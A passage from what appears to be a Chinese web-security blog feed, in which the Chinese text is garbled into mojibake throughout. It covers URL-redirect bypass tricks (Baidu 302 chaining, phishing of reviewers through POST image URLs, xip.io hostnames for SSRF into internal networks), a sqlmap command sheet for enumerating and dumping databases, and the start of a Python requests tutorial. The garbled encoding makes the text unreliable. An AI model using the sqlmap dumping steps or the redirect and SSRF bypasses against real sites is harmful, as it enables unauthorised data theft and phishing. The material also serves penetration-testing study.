ä¸ä¸€å®šè¦å¯¹çš„ï¼Œéšä¾¿éƒ½å¯ä»¥ï¼Œä½†å¾—è§†ç³»ç»Ÿè€Œå®šå§ã€‚è¿™ä¸ªæˆ‘é‡åˆ°äº†å¾ˆå¤šï¼Œæ¯”å¦‚ä½ ä¿®æ”¹äº†åŸŸåï¼Œç„¶åç‚¹å‡»ç™»é™†ï¼Œç™»é™†æˆåŠŸåä¾¿å¯è§¦å‘è·³è½¬ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒéšè”½çš„ç»•è¿‡URLé™åˆ¶çš„è·³è½¬ã€‚</p><h3 id="åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶">åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶</h3><p>æ¯”å¦‚ä¸€ä¸ª URLï¼Œå®ƒæ˜¯å¯ä»¥ç›´æ¥è·³è½¬çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æµ‹è¯•è·³è½¬æ—¶å¤§å®¶ä¹ æƒ¯ç”¨www.baidu.com æˆ– qq.comè¿™æ ·çš„å¯ä¿¡ç«™ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æœ‰äº›ç½‘ç«™æ˜¯å¯ä»¥è·³è½¬è¿™äº›ç½‘ç«™çš„ï¼Œåªè¦æ˜¯å¯ä¿¡ç«™ç‚¹ä¸”å¸¸ç”¨ï¼ŒåŸºæœ¬éƒ½å¯ä»¥è·³è½¬ï¼Œé‚£ä¹ˆè¿™å°±å±äºæ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘äº†ã€‚éš¾é“å°±è¿™æ ·é”™å¤±ä¸€ä¸ªURL è·³è½¬æ¼æ´äº†ï¼Ÿå…¶å®ä¸ç„¶ï¼Œåªè¦ä½ çš„ URLè¢«ç™¾åº¦æ”¶å½•è¿‡ï¼Œé‚£ä¹ˆç›´æ¥æœç´¢ä½ çš„åŸŸåï¼Œsite:xxx.xxxå› ä¸ºä½ åœ¨ç™¾åº¦é‡Œç‚¹å‡»ä½ çš„åŸŸåï¼Œå®ƒä¼šå…ˆæ˜¯ä¸€ä¸ª 302 è·³è½¬ï¼Œè€Œè¿™ä¸ª 302è·³è½¬å°±æ˜¯ç™¾åº¦ä¸‹çš„ 302è·³è½¬ï¼Œé‚£ä¹ˆè¿™æ ·å°±å¯ä»¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹çš„é™åˆ¶ï¼Œä»è€Œè¾¾åˆ°è·³è½¬åˆ°æŒ‡å®šURLï¼Œå½“ç„¶ï¼Œç™¾åº¦è¿™ä¸ª 302 æœ‰ç‚¹é•¿ï¼Œä½ ç»™å®ƒè¿›è¡ŒåŠ å¯†å°±è¡Œã€‚</p><h3 id="post-å‚æ•°ä¸­çš„-url-è·³è½¬">POST å‚æ•°ä¸­çš„ URL è·³è½¬</h3><p>å½“ç„¶ï¼Œè¿™ä¸ªå½±å“å°±å¾ˆå°äº†ï¼Œæ¯”å¦‚å½“ä½ å¡«ä»€ä¹ˆè¡¨æ ¼æˆ–è€…éœ€è¦å¡«å†™ä»€ä¹ˆçš„ï¼Œå½“ä½ ä¸Šä¼ å›¾ç‰‡ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥çš„æ—¶å€™ï¼Œé€šå¸¸ä¸‹ä¸€æ­¥å°±æ˜¯é¢„è§ˆä½ å¡«å†™çš„ä¿¡æ¯ï¼Œæœ€åæ‰æ˜¯æäº¤ï¼Œå½“ä½ ä¸Šä¼ äº†å›¾ç‰‡åç‚¹å‡»ä¸‹ä¸€æ­¥æŠ“åŒ…ï¼Œå¦‚æœè¿‡æ»¤ä¸ä¸¥ï¼Œä½ ä¼šçœ‹åˆ°å›¾ç‰‡çš„å®Œæ•´åœ°å€åŒ…å«åœ¨POST å‚æ•°é‡Œï¼Œä½ å°±å¯ä»¥ç›´æ¥ä¿®æ”¹è¿™ä¸ªåœ°å€ä¸ºä»»æ„URLï¼Œç„¶ååˆ°è¾¾ä¸‹ä¸€æ­¥ï¼Œè¿™æ—¶æ˜¯ç¡®å®šä¿¡æ¯ä¹Ÿå°±æ˜¯é¢„è§ˆè‡ªå·±å¡«å†™çš„ä¿¡æ¯çš„æ­£ç¡®è¿˜æ˜¯ä¸æ­£ç¡®ï¼Œç”±äºä½ åˆšåˆšä¿®æ”¹äº†å›¾ç‰‡åœ°å€ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œå›¾åƒä¼šæ˜¯ä¸€ä¸ªå°XXï¼Œå½“ç‚¹å‡»å›¾ç‰‡å³é”®é€‰æ‹©æŸ¥çœ‹å›¾åƒæ—¶ï¼Œå°±ä¼šè§¦å‘ URLè·³è½¬é—®é¢˜ï¼Œå…¶å®è¿™ä¸ªä¹Ÿå¯ä»¥åˆ©ç”¨æ¥è¿›è¡Œé’“é±¼ï¼Œé’“åå°å®¡æ ¸å‘˜çš„ä¿¡æ¯ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œæ¯”å¦‚å®¡æ ¸çœ‹åˆ°å›¾ç‰‡æ— æ³•åŠ è½½ï¼Œä¸€èˆ¬éƒ½ä¼šç‚¹å‡»æŸ¥çœ‹å›¾ç‰‡ï¼Œç„¶åè·³è½¬ï¼Œå¦‚æœå®‰å…¨æ„è¯†ä¸çŸ¥å°±ä¼šé€ æˆå®‰å…¨å½±å“ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœ POST å‚æ•°é‡Œå°±åªæ˜¯ URL è·³è½¬å‚æ•°ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç»™å®ƒè½¬æˆ GETæ–¹å¼ï¼Œç„¶åè¿›è¡Œè·³è½¬å°±å¯ä»¥äº†ï¼Œåªè¦ç½‘ç«™æ”¯æŒè¿™æ ·çš„ GET æ–¹å¼å°±è¡Œï¼Œåœ¨ BurpSuite é‡Œå¯ä»¥ä¸€é”®è½¬æ¢æäº¤æ–¹å¼ï¼Œå³é”®é€‰æ‹© Change request methodå°±å¯ä»¥ï¼</p><h3 id="åˆ©ç”¨-xip.io-ç»•è¿‡">åˆ©ç”¨ xip.io ç»•è¿‡</h3><p>è¯·æ±‚æ˜¯ <ahref="http://www.127.0.0.1.xip.io/">http://www.127.0.0.1.xip.io</a>è¿™ä¸ªç»•è¿‡æ˜¯åœ¨ SSRF åœºæ™¯ä¸­çš„ç»•è¿‡ï¼Œæ¯”å¦‚ SSRFä½ è¦è¯»å–å†…ç½‘åœ°å€ï¼Œä¸€èˆ¬éƒ½åšäº†é™åˆ¶ï¼Œå¯ä»¥å°è¯•ç”¨è¿™æ–¹æ³•è¿›è¡Œç»•è¿‡é™åˆ¶ï¼Œä»è€Œè®¿é—®åˆ°å†…ç½‘ã€‚å¦å¤–ä¸€ç‚¹ï¼ŒURLè·³è½¬æ¶‰åŠçš„å®‰å…¨é—®é¢˜å¤§å®¶å¸¸è§çš„å°±æ˜¯é’“é±¼ï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªæ€è·¯ä¹Ÿå¯è¾¾æˆä¸€ä¸ªé’“é±¼é—®é¢˜ï¼Œå¦‚ï¼Œ<ahref="http://www.qq.com.220.181.57.217.xip.io/">http://www.qq.com.220.181.57.217.xip.io</a>å½“ä½ è®¿é—® qq è¿™ä¸ªåŸŸåæ—¶ï¼Œå…¶å®è¿™ä¸ªé“¾æ¥å·²ç»è¢«è§£æåˆ°åé¢è¿™ä¸ª IPåœ°å€ä¸Šäº†ï¼Œé‚£ä¹ˆå®é™…è®¿é—®çš„å°±æ˜¯åé¢è¿™ä¸ª IP åœ°å€ã€‚</p><h2 id="æ¼æ´ä¿®å¤çš„æ–¹æ³•">æ¼æ´ä¿®å¤çš„æ–¹æ³•</h2><ol type="1"><li>è‹¥è·³è½¬çš„ URL äº‹å…ˆæ˜¯å¯ä»¥ç¡®å®šçš„ï¼ŒåŒ…æ‹¬ urlå’Œå‚æ•°çš„å€¼ï¼Œåˆ™å¯ä»¥åœ¨åå°å…ˆé…ç½®å¥½ï¼Œurl å‚æ•°åªéœ€ä¼ å¯¹åº” urlçš„ç´¢å¼•å³å¯ï¼Œé€šè¿‡ç´¢å¼•æ‰¾åˆ°å¯¹åº”å…·ä½“ url å†è¿›è¡Œè·³è½¬ï¼›</li><li>è‹¥è·³è½¬çš„ URLäº‹å…ˆä¸ç¡®å®šï¼Œä½†å…¶è¾“å…¥æ˜¯ç”±åå°ç”Ÿæˆçš„ï¼ˆä¸æ˜¯ç”¨æˆ·é€šè¿‡å‚æ•°ä¼ äººï¼‰ï¼Œåˆ™å¯ä»¥å…ˆç”Ÿæˆå¥½è·³è½¬é“¾æ¥ç„¶åè¿›è¡Œç­¾åï¼Œè€Œè·³è½¬cg é¦–å…ˆéœ€è¦è¿›è¡ŒéªŒè¯ç­¾åé€šè¿‡æ‰èƒ½è¿›è¡Œè·³è½¬ï¼›</li><li>è‹¥ 1 å’Œ 2 éƒ½ä¸æ»¡è¶³ï¼Œurläº‹å…ˆæ— æ³•ç¡®å®šï¼Œåªèƒ½é€šè¿‡å‰ç«¯å‚æ•°ä¼ å…¥ï¼Œåˆ™å¿…é¡»åœ¨è·³è½¬çš„æ—¶å€™å¯¹ urlè¿›è¡ŒæŒ‰è§„åˆ™æ ¡éªŒï¼šå³æ§åˆ¶ urlæ˜¯å¦æ˜¯ä½ ä»¬å…¬å¸æˆæƒçš„ç™½åå•æˆ–è€…æ˜¯ç¬¦åˆä½ ä»¬å…¬å¸è§„åˆ™çš„ urlï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function checkURL ( sURL) &#123;</span><br><span class="line">return (/^(https?:\/\/)?[\w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|\/|\)/i).test(sUrl)||(/^[\w][\w\/.-_%]+$/i).test(sUrl)||(/^[\/\][^\/\]/i).test(sUrl) ? true : false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4" type="1"><li>XSS æ¼æ´çš„æ³¨æ„äº‹é¡¹ ï¼šè·³è½¬ url æ£€æµ‹ä¸­ä¹ŸåŠ å…¥äº† CRLFå¤´éƒ¨æ³¨å…¥æ¼æ´çš„æ£€æµ‹é€»è¾‘, å…·ä½“å°±æ˜¯åœ¨è¯·æ±‚å‚æ•°ä¸­åŠ å…¥äº†%0d%0aè¿™ç§æµ‹è¯•ä»£ç ï¼Œéœ€è¦å¯¹è¿™äº›å‚æ•°è¿›è¡Œåˆ é™¤å¤„ç†(äº‹å®ä¸Šï¼šåœ¨åˆ¤æ–­åˆ°ä¸€ä¸ªå‚æ•°ä¸­åŒ…å«%00 -&gt; %1f çš„æ§åˆ¶å­—ç¬¦æ—¶éƒ½æ˜¯ä¸åˆæ³•çš„ï¼Œéœ€å¯¹å…¶è¿›è¡Œåˆ é™¤)ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap åŸºç¡€å‘½ä»¤</title>
      <link href="/blog/2019/10/05/websec/sql_injection/sqlmap/"/>
      <url>/blog/2019/10/05/websec/sql_injection/sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="å¤§ä½¬åšæ–‡">å¤§ä½¬åšæ–‡</h1><p><a href="https://www.freebuf.com/articles/web/29942.html">SQL æ³¨å…¥ä¹‹SQLmap å…¥é—¨</a></p><p><a href="https://www.jianshu.com/p/4fb15a2c9040">SQLMapç”¨æˆ·æ‰‹å†Œã€è¶…è¯¦ç»†ã€‘</a></p><p><a href="https://www.jianshu.com/p/cf7f646b3448">ä½¿ç”¨ sqlmapæ›²æŠ˜æ¸—é€æŸæœåŠ¡å™¨</a></p><h1 id="å¸¸ç”¨å‘½ä»¤">å¸¸ç”¨å‘½ä»¤ï¼š</h1><h2 id="æ£€æµ‹æ³¨å…¥">æ£€æµ‹æ³¨å…¥</h2><p>sqlmap -u ä½ è¦æµ‹è¯•çš„ url</p><p>å½“ç„¶ï¼Œå‚æ•°ç”¨ä¸ç”¨å¼•å·åŒ…å›´éƒ½å¯ä»¥ï¼Œä½¿ç”¨å•åŒå¼•å·ä¹Ÿæ— æ‰€è°“ã€‚</p><p>--start æŒ‡å®šä»ç¬¬å‡ æ¡è®°å½•å¼€å§‹è¯»å–; --stopæŒ‡å®šè¯»å–åˆ°ç¬¬å‡ æ¡è®°å½•ç»“æŸã€‚</p><p>å¦‚æœè¦è·³è¿‡çˆ†ç ´æ•°æ®è¡¨/å­—æ®µç­‰ï¼Œç›´æ¥è„±è£¤ï¼Œå¯ä»¥ä½¿ç”¨ --dump -Dæ•°æ®åº“å</p><p>--dbs çŒœè§£åº“å -D æŒ‡å®šæŸä¸ªåº“</p><p>--tables çŒœè§£è¡¨å -T æŒ‡å®šè¡¨</p><p>--columns çŒœè§£åˆ—å -C æŒ‡å®šå­—æ®µ</p><p>--dump æ ¹æ®æŒ‡å®šçš„ä½ç½®ï¼ˆå¯ä»¥ä¸ä¸Šé¢-å¤§å†™å­—æ¯è¿ç”¨ï¼‰çˆ†æ•°æ®</p><h2 id="è¡¥å……">è¡¥å……</h2><ol type="1"><li><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ åé¢ç”¨å•è¯é¦–å­—æ¯/ç¼©å†™ï¼Œä¸¤ä¸ªæ åé¢ç”¨å®Œæ•´å•è¯ã€‚</p></li><li><p>-b, --banner Retrieve DBMS banner å–å› DBMS çš„ bannerã€‚</p><p>banner ç¿»è¯‘ä¸ºæ ‡é¢˜ï¼Œæ——å¸œï¼Œæ ‡è¯†ã€‚ä¸€èˆ¬æœ‰ä»¥ä¸‹å››é¡¹(ä¸‹é¢æ˜¯ä¸€ä¸ª bannerå®ä¾‹)</p><blockquote><p>web server operating system: Windows web application technology:Apache 2.4.23, PHP 5.3.29 back-end DBMS: MySQL &gt;= 5.0 banner:'5.5.53'</p></blockquote></li><li><p>F12 æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œæ‰¾åˆ° console é¡µé¢ï¼Œè¾“å…¥ document.cookieå¯ä»¥ä¸€èµ·æŸ¥çœ‹æ‰€æœ‰ cookiesã€‚ï¼ˆæ„å‘³ç€å¯ä»¥ä¸€èµ·å¤åˆ¶ï¼‰</p></li><li><p>æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œè¯¢é—®ä½ å…³äºä¸€äº›é…ç½®é—®é¢˜æ—¶ï¼Œä¼šå‡ºç°[Y/n]ï¼Œå¤§å†™çš„ä¸ºé»˜è®¤çš„ï¼Œå³ï¼šæŒ‰ä¸‹å›è½¦ä¾¿æ˜¯å¤§å†™çš„é‚£ä¸ªå­—æ¯ä»£è¡¨çš„æ„æ€ï¼Œè¿™é‡Œæ˜¯yesã€‚</p><p>ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œä¸å†™--batchçš„æ—¶å€™ï¼Œé‡åˆ°çš„ä¸€äº›é€‰é¡¹éƒ½é€‰é»˜è®¤æ²¡æœ‰é—®é¢˜ï¼Œå¦‚æœé‡åˆ°é‡å®šå‘ï¼Œå¯ä»¥é€‰n,è™½ç„¶é»˜è®¤æ˜¯ Yï¼‰</p></li><li><p>post æ³¨å…¥</p><ol type="1"><li><p>sql ä¸ burpsuite é…åˆï¼š</p><p>é€šè¿‡ burpsuite æŠ“åŒ…ï¼Œç„¶åå°†æŠ¥æ–‡ copy to fileï¼Œä½¿ç”¨ sqlmap çš„ -rå‚æ•°è¯»å–è¯¥æ–‡ä»¶</p><p>æ¯”å¦‚ï¼šsqlmap -r get.txt</p></li><li><p>--data=â€˜post æ•°æ®ï¼ˆä¸ hackbar æ ¼å¼ä¸€æ ·ï¼‰â€™</p></li></ol><p>-p å‚æ•°å æŒ‡å®šè¦æ£€æµ‹çš„å‚æ•°çš„åå­—ï¼Œå¯ç”¨å¯ä¸ç”¨</p></li><li><p>--batch å‚æ•° nerver ask for user input use default option</p><p>ä¸å‘ç”¨æˆ·è¯·æ±‚ä¸€äº›å‚æ•°ï¼Œä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ï¼Œå› ä¸ºå¦‚æœä¸åŠ è¯¥å‚æ•°ï¼Œåœ¨æ‰«æè¿‡ç¨‹æˆåŠŸï¼Œä½ ä¼šå‘ç°å®ƒä¼šæš‚åœï¼Œè¯¢é—®å¦‚ï¼šDBMSä¼¼ä¹æ˜¯ mysqlï¼Œæ˜¯å¦ä½¿ç”¨ä¸€åˆ‡ mysqlæ³¨å…¥æ–¹å¼è¿›è¡Œæ£€æµ‹æ”¾å¼ƒå…¶ä»–æ•°æ®åº“ç±»å‹æ£€æµ‹ç­‰ã€‚</p></li></ol><h1 id="sqlmp-ä¸-burpsuite">Sqlmp ä¸ BurpSuite</h1><p>sqlmap é€šè¿‡è§£æ burp suite æ‹¦æˆªçš„ httpæŠ¥æ–‡ï¼Œä»è€Œè·å–ä¿¡æ¯ï¼Œç„¶åè¿›è¡Œæ£€æµ‹ã€‚</p><p>sqlmap -r filename --batch -smart</p><p>sqlmap -l filename --batch -smart</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Requests åŸºç¡€</title>
      <link href="/blog/2019/10/05/programming/python/requests_basic/"/>
      <url>/blog/2019/10/05/programming/python/requests_basic/</url>
      
        <content type="html"><![CDATA[<h1 id="requests-å…¥é—¨">Requests å…¥é—¨</h1><p><a href="https://requests.readthedocs.io/en/master/">å®˜æ–¹æ–‡æ¡£</a></p><p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆè¦å­¦ä¹  requestsï¼Œè€Œä¸æ˜¯ urllibï¼Ÿ</p><ol type="1"><li><p>Requests çš„åº•å±‚å®ç°å°±æ˜¯ urlib</p></li><li><p>Requests åœ¨ python2 å’Œ python3 ä¸­é€šç”¨ï¼Œæ–¹æ³•å®Œå…¨ä¸€æ ·</p></li><li><p>Requests ç®€å•æ˜“ç”¨</p></li><li><p>Requests èƒ½å¤Ÿè‡ªåŠ¨å¸®åŠ©æˆ‘ä»¬è§£å‹ï¼ˆgzip å‹ç¼©çš„ç­‰ï¼‰ç½‘é¡µå†…å®¹</p></li></ol><h1 id="å®‰è£…æ¨¡å—">å®‰è£…æ¨¡å—</h1><ol type="1"><li><p>ä½¿ç”¨ pip install</p><p>pip --version æŸ¥çœ‹å½“å‰ pip æ˜¯ Python 2 çš„ï¼Œè¿˜æ˜¯ Python 3 çš„</p><p>æ³¨ï¼šç›´æ¥è¾“å…¥å·¥å…·åå›è½¦ï¼Œä¸€èˆ¬éƒ½æ˜¯å¸®åŠ©ä¿¡æ¯</p></li><li><p>ä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å‹ï¼Œä½¿ç”¨ Python è¿è¡Œ setup.py</p></li><li></li></ol><p>HTTP è¯·æ±‚æ–¹æ³•ï¼š</p><p>getã€postã€putã€deleteã€option</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">response = requests.post(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿”å›ä¸€ä¸ª response å¯¹è±¡ï¼Œé€šè¿‡ responseå¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¤„ç†å“åº”å†…å®¹ã€‚</p><h1 id="å±æ€§ä¸æ–¹æ³•">å±æ€§ä¸æ–¹æ³•</h1><p><strong>åŒºåˆ†å±æ€§ä¸æ–¹æ³•ï¼š</strong></p><p>å±æ€§æ˜¯åè¯ï¼Œæ˜¯å¯¹è±¡å›ºæœ‰çš„å±æ€§</p><p>æ–¹æ³•æ˜¯åŠ¨è¯ï¼Œæ˜¯å¯¹è±¡å¯ä»¥åšçš„äº‹æƒ…</p><h2 id="response.text">response.text</h2><ul><li><p>ç±»å‹ï¼šstr</p></li><li><p>è§£ç ç±»å‹ï¼šæ ¹æ® HTTPå¤´éƒ¨å¯¹å“åº”çš„ç¼–ç ä½œå‡ºæœ‰æ ¹æ®çš„æ¨æµ‹ï¼Œæ¨æµ‹çš„æ–‡æœ¬ç¼–ç </p></li><li><p>å¦‚ä½•ä¿®æ”¹ç¼–ç æ–¹å¼ï¼šresponse.encoding=â€gbkâ€</p></li><li><p>Requests ä¼šè‡ªåŠ¨å¯¹å“åº”æ­£æ–‡è¿›è¡Œè§£ç ï¼šå¦‚æœ Response.encodingä¸ºç©ºï¼Œé‚£ä¹ˆ requests æ ¹æ® headeræ¥ç¡®å®šå“åº”çš„ç¼–ç æ–¹å¼ï¼Œç„¶åè¿›è¡Œè§£ç ã€‚å¦‚æœä½ å¯ä»¥ç¡®å®šå“åº”çš„ç¼–ç æ–¹å¼ï¼Œä¹Ÿå¯ä»¥å…ˆå¯¹Response.encoding è¿›è¡Œè®¾ç½®ï¼Œç„¶åå†é€šè¿‡ Response.textè·å–å“åº”æ­£æ–‡ã€‚</p></li></ul><h2 id="response.content">response.content</h2><ul><li><p>ç±»å‹ï¼šbytes</p></li><li><p>è§£ç ç±»å‹ï¼šæ²¡æœ‰æŒ‡å®š</p></li><li><p>å¦‚ä½•ä¿®æ”¹ç¼–ç æ–¹å¼ï¼šresponse.content.deocdeï¼ˆâ€œutf8"ï¼‰</p></li><li><p>å¦‚æœä½ æƒ³å–æ–‡æœ¬ï¼Œå¯ä»¥é€šè¿‡ r.textã€‚ å¦‚æœæƒ³å–å›¾ç‰‡ï¼Œæ–‡ä»¶ï¼Œåˆ™å¯ä»¥é€šè¿‡r.contentã€‚ ï¼ˆ resp.json() è¿”å›çš„æ˜¯ json æ ¼å¼æ•°æ®ï¼‰</p><p>å½“ç„¶ï¼Œç”±äºäºŒè¿›åˆ¶æ˜¯æœ€åŸå§‹çš„æ•°æ®ï¼Œæˆ‘ä»¬æ–¹ä¾¿å¯¹ä»–è¿›è¡Œä»»æ„æ“ä½œï¼Œäºæ˜¯å¸¸ç”¨ä¸”æ¨èä½¿ç”¨:<strong>response.content.decode()</strong></p></li></ul><p><strong>requests ä¸­è§£å†³ç¼–è§£ç é—®é¢˜ï¼š</strong></p><ul><li>response.content.decode() é»˜è®¤ä½¿ç”¨ utf8</li><li>response.content.decode('gbk')</li><li>response.text</li></ul><h2 id="response.status_code-çŠ¶æ€ç ">response.status_code çŠ¶æ€ç </h2><p>å½“çŠ¶æ€ç ä¸º 200 æ—¶ï¼Œåªèƒ½è¯´è¯·æ±‚æŸä¸ª URLæˆåŠŸäº†ï¼Œä½†æ˜¯ä¸ä¸€å®šæ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•° URL åœ°å€ã€‚</p><p>æ¯”å¦‚ï¼šæˆ‘ä»¬ç°åœ¨è¯·æ±‚ä¸€ä¸ªç™»é™†ä¹‹åæ‰èƒ½è®¿é—®çš„é¡µé¢ï¼ŒæœåŠ¡å™¨ä¼šå°†æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼Œè€Œæˆ‘ä»¬æˆåŠŸè®¿é—®ç™»å½•é¡µé¢ï¼Œäºæ˜¯è¿”å›200.</p><p>åŒºåˆ† 4xx or 5xx ä¸ 200</p><ol type="1"><li><p>ç›´æ¥ä½¿ç”¨ <code>response.status_code</code> æˆ–è€…<code>assert resposne.status_code == 200</code>ï¼ˆéœ€è¦ tryexceptï¼‰</p></li><li><p><code>response.raise_for_status()</code> raise an exception forerror codes (4xx or 5xx),</p></li></ol><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦è¯·æ±‚å¾ˆå¤šç½‘é¡µï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œä¸“é—¨å‘é€è¯·æ±‚è·å¾—ç›¸åº”å“åº”ï¼Œå¹¶è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚ç„¶åå†åœ¨åˆ«çš„æ–¹æ³•ä¸­è¿›è¡Œå¤„ç†ã€‚</p><h2 id="response.header-å“åº”å¤´">response.header å“åº”å¤´</h2><p>å“åº”å¤´ï¼Œä¸€èˆ¬åªå…³æ³¨ Set-Cookie å­—æ®µ</p><p>å½“æˆ‘ä»¬å…³æ³¨ç½‘ç«™å¦‚ä½•è®¾ç½® cookie çš„æ—¶å€™ï¼Œä¸åº”è¯¥åªç®¡å“åº”å¤´çš„ Set-Cookieå­—æ®µï¼Œå› ä¸ºä¹Ÿå¯ä»¥é€šè¿‡ JS è®¾ç½® cookie åˆ°æœ¬åœ°ï¼Œæ‰€ä»¥ä¹Ÿè¦å…³æ³¨ä¸€ä¸‹ JSã€‚</p><p>response.requestä¸­æœ‰ç€å…³äºè¯·æ±‚æŠ¥æ–‡çš„ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡å¯¹åº”çš„æ–¹æ³•è·å¾—ã€‚</p><p>response.request.header è¯·æ±‚å¤´ã€response.request.method è¯·æ±‚æ–¹æ³•</p><p>æ³¨æ„ï¼š</p><ol type="1"><li>å¦‚æœé‡åˆ°é‡å®šå‘ï¼Œè¯·æ±‚å’Œå“åº”çš„ URL å°±ä¼šä¸ä¸€æ ·ã€‚</li><li>requests æ¨¡å—é»˜è®¤çš„ User-Agent ä¸ºpython-requests/2.22.0ï¼ˆç‰ˆæœ¬å·å¯ç•¥æœ‰ä¸åŒï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨å®ƒæ—¶ï¼Œè¦å•ç‹¬è®¾ç½®UAï¼Œå¦åˆ™ä¼šè¢«ç«‹å³è¯†åˆ«ä¸ºçˆ¬è™«ï¼Œç„¶åè¿”å›ä¸€ä¸ªä¸æµè§ˆå™¨çš„é¡µé¢ä¸ä¸€å®šç›¸åŒçš„é¡µé¢ã€‚</li></ol><h2 id="å‘é€å¸¦-header-è¯·æ±‚">å‘é€å¸¦ header è¯·æ±‚</h2><p>æˆ‘ä»¬åªéœ€è¦ä¼ é€’ä¸€ä¸ªå­—å…¸å½¢å¼çš„ header å‚æ•°å³å¯ï¼Œæ³¨æ„ï¼šheaderéœ€è¦æ˜¯é”®å€¼å¯¹çš„å½¢å¼ï¼Œä¸è¦åªå†™å€¼ï¼Œä¸å†™å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure><p>æ­¤å¤„ï¼Œæˆ‘ä»¬å‘é€å¸¦ headerè¯·æ±‚æ˜¯ä¸ºäº†æ¨¡æ‹Ÿæµè§ˆå™¨ï¼Œé˜²æ­¢è¢«è¯†åˆ«ä¸ºçˆ¬è™«ã€‚å¦‚æœæœ‰ä¸€å¤©æˆ‘ä»¬å•å•å¸¦ä¸ŠUAï¼Œè¿˜æ˜¯ä¼šè¢«è¯†åˆ«ä¸ºçˆ¬è™«ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦è€ƒè™‘å¸¦ä¸Š headersä¸­åˆ«çš„å­—æ®µå€¼äº†ã€‚å¦‚æœè¿˜ä¸è¡Œï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ å¸¦ä¸Š cookie</p><h2 id="å‘é€å¸¦å‚æ•°çš„è¯·æ±‚">å‘é€å¸¦å‚æ•°çš„è¯·æ±‚</h2><p>æ¯”å¦‚ä»¥ä¸‹ URL ä¸­ ï¼Ÿåé¢ä¾¿æ˜¯å‚æ•°çš„é”®å€¼å¯¹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.google.com/search?q=python</span><br></pre></td></tr></table></figure><p>å‚æ•°å½¢å¼ï¼šå­—å…¸</p><p>æ³¨æ„ï¼šæœ‰çš„å‚æ•°å¯¹è¯·æ±‚å†…å®¹æ¥è¯´æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œæˆ‘ä»¬è¦æµ‹è¯•å‡ºé‚£äº›é‡è¦çš„å‚æ•°ã€‚</p><p><strong>ä¸¤ç§æ–¹å¼ï¼š</strong></p><ol type="1"><li><p>requests æä¾›çš„æ–¹å¼</p><p>æ¯”å¦‚ï¼šhttps://xxx.com/search.php?key=Python&amp;time=2018</p><p>url = 'https://xxx.com/search.php' # æ³¨æ„ï¼šå¸¦ä¸å¸¦é—®å·å‡å¯ï¼Œrequestsä¼šåˆ¤æ–­æœ‰æ— é—®å·ï¼Œç„¶åå¸®æˆ‘ä»¬è°ƒæ•´ï¼Œä½¿å…¶æœ‰ä¸€ä¸ªé—®å·ã€‚</p><p>keyword=ï½›â€˜keyâ€™:'Python', 'time':2018ï½</p><p>requests.get(url, params=keyword)</p></li><li><p>æ‹¼æ¥å­—ç¬¦ä¸²</p><p><a href="https://zhuanlan.zhihu.com/p/37936007">å­—ç¬¦ä¸²æ ¼å¼åŒ–</a></p><p>3.6 